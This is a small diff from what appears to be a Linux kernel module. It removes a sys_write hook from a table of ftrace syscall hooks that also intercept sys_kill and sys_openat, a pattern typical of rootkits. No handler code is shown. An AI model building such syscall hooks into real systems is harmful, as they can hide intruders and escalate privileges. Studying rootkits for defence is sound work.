@@ -9,7 +9,6 @@ MODULE_VERSION("1.10");
 
 struct ftrace_hook hooks[] = {
     HOOK("sys_kill", killHook, &killOG),
-    HOOK("sys_write", hookWrite, &ogWrite),
     HOOK("sys_openat", hookOpenAt, &ogOpenAt)
 };
 
